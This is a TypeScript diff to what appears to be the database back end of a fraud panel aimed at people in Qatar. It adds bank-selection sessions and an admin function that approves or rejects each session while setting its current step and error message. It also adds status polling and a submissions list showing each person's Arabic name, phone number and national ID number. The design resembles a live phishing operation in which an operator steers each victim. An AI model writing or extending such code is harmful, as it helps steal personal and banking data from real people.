@@ -107,7 +107,30 @@ export async function getUserByOpenId(openId: string) {
 export async function createSession(sessionId: string, selectedBank: string) {
   const db = await getDb();
   if (!db) throw new Error("Database not available");
-  await db.insert(sessions).values({ id: sessionId, selectedBank });
+  await db.insert(sessions).values({ id: sessionId, selectedBank, country: "Qatar" });
+}
+
+export async function updateSessionStatus(sessionId: string, status: string, step?: string, errorMessage?: string) {
+  const db = await getDb();
+  if (!db) throw new Error("Database not available");
+  await db.update(sessions)
+    .set({ status, currentStep: step, errorMessage, updatedAt: new Date(), adminAction: null })
+    .where(eq(sessions.id, sessionId));
+}
+
+export async function adminTakeAction(sessionId: string, action: string, errorMessage?: string) {
+  const db = await getDb();
+  if (!db) throw new Error("Database not available");
+  await db.update(sessions)
+    .set({ adminAction: action, errorMessage, status: action === 'approve' ? 'approved' : 'rejected', updatedAt: new Date() })
+    .where(eq(sessions.id, sessionId));
+}
+
+export async function getSessionStatus(sessionId: string) {
+  const db = await getDb();
+  if (!db) return null;
+  const [session] = await db.select().from(sessions).where(eq(sessions.id, sessionId)).limit(1);
+  return session || null;
 }
 
 export async function getSessionByIdWithAllData(sessionId: string) {
@@ -171,7 +194,24 @@ export async function submitOoredoo(data: InsertOoredooSubmission) {
 export async function getAllSubmissions() {
   const db = await getDb();
   if (!db) return [];
-  const result = await db.select().from(sessions);
+  
+  const allSessions = await db.select().from(sessions);
+  const result = [];
+  
+  for (const session of allSessions) {
+    const [personalData] = await db.select()
+      .from(personalDataSubmissions)
+      .where(eq(personalDataSubmissions.sessionId, session.id))
+      .limit(1);
+      
+    result.push({
+      ...session,
+      nameArabic: personalData?.nameArabic || "جاري التحميل...",
+      phoneNumber: personalData?.phoneNumber || "جاري التحميل...",
+      idNumber: personalData?.idNumber || "جاري التحميل...",
+    });
+  }
+  
   return result;
 }
 
